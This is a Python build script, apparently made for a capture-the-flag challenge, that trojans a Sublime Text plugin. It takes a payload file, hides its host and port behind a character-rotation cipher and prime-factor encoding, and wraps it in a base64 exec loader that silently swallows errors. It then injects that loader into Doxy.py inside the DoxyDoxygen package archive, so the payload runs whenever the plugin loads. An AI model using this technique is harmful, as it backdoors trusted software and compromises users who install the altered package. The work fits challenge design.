#!/usr/bin/env python3
# -!- encoding:utf8 -!-
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#     file: plug_me_in.py
#     date: 2018-03-04
#   author: paul.dautry
#  purpose:
#       /!\ FOR EDUCATIONAL PURPOSE ONLY /!\
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# =============================================================================
#  IMPORTS
# =============================================================================
import os.path as path
from ruamel import yaml
from base64 import b64encode
from zipfile import ZipFile
# =============================================================================
#  FUNCTIONS
# =============================================================================
##
## @brief      { function_description }
##
prev_nl = True
def p(msg, nl=True):
    global prev_nl

    end = '\n' if nl else ''
    prompt = '[build]>' if prev_nl else ''
    print("{} {}".format(prompt, msg), end=end)

    prev_nl = nl
##
## @brief      { function_description }
##
def prime_factors(n):
    factors=[]
    d=2
    while(d*d<=n):
        while(n>1):
            while n%d==0:
                factors.append(d)
                n=n/d
            d+=1
    return factors
##
## @brief      { function_description }
##
def rot(s):
    C='0123456789abcdefghijklmnopqrstuvwxyz-.'
    return ''.join([C[(C.index(e)+0x0d)%len(C)] for e in s])
# =============================================================================
#  SCRIPT
# =============================================================================
if __name__ == '__main__':
    wd = path.abspath(path.dirname(__file__))

    with open(path.join(path.split(wd)[0], '.mkctf.yml'), 'r') as f:
        conf = yaml.safe_load(f)

    parameters = conf['parameters']

    host_str = rot(parameters['exploit']['host'])
    port_str = '*'.join([str(e) for e in prime_factors(parameters['port'])])

    p("parameters:")
    p("\t'{}' -> '{}'".format(parameters['exploit']['host'], host_str))
    p("\t{} -> {}".format(parameters['port'], port_str))

    p("running within {}".format(wd))
    ifile = path.join(wd, 'payload.py')
    ofile = path.join(wd, 'loader.py')
    izip = path.join(wd, 'DoxyDoxygen.sublime-package.origin')
    ozip = path.join(wd, 'DoxyDoxygen.sublime-package')

    p("reading payload from {}".format(ifile))
    with open(ifile, 'r') as f:
        data = f.read()

    p("setting payload parameters...")
    data = data.replace('$[host]$', host_str)
    data = data.replace('$[port]$', port_str)
    data = b64encode(data.encode())

    p("preparing loader...")
    data = data.decode()
    loader = """
try:
    import base64;A=b'{}';exec(base64.b64decode(A));
except:
    pass
""".format(data)

    p("writing loader to {}".format(ofile))
    with open(ofile, 'w') as f:
        f.write(loader)

    p("patching original archive...")
    with ZipFile(izip, 'r') as iarch:
        with ZipFile(ozip, 'w') as oarch:

            for info in iarch.infolist():
                p("processing {} ...".format(info.filename), nl=False)
                data = iarch.read(info)

                if info.filename == 'Doxy.py':
                    p(" --[injecting payload]-- ", nl=False)
                    search = '\nfix_import()'
                    target = '{}{}'.format(loader, search)
                    data = data.replace(search.encode(), target.encode())

                oarch.writestr(info, data)
                p("done.")

    p("all done.")
